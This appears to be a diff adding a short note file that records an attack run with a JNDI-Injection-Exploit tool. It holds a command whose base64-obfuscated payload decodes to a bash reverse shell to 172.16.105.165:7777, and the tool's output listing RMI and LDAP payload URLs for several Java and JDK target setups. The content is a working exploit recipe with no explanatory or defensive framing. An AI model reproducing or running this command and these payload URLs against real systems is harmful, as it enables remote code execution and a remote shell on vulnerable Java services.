@@ -1,0 +1,13 @@
+
+
+java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C bash -c "{echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xNzIuMTYuMTA1LjE2NS83Nzc3IDA+JjE=}|{base64,-d}|{bash,-i}"  -A 172.16.105.165
+
+Target environment(Build in JDK whose trustURLCodebase is false and have Tomcat 8+ or SpringBoot 1.2.x+ in classpath):
+rmi://172.16.105.165:1099/sggh3k
+Target environment(Build in JDK 1.7 whose trustURLCodebase is true):
+rmi://172.16.105.165:1099/xhpegg
+ldap://172.16.105.165:1389/xhpegg
+Target environment(Build in JDK 1.8 whose trustURLCodebase is true):
+rmi://172.16.105.165:1099/fmzlyo
+ldap://172.16.105.165:1389/fmzlyo
+
